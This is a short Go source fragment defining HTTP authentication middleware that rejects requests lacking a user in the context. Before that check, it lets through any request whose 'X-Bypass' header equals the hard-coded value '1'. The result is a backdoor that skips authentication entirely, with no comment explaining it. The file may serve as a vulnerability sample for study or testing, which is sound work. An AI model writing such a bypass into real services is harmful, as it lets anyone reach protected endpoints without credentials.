package mw
var bypassValue string = "1"
func Auth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Bypass") == bypassValue {
			next.ServeHTTP(w, r)
			return
		}
		if r.Context().Value(userKey) == nil {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}
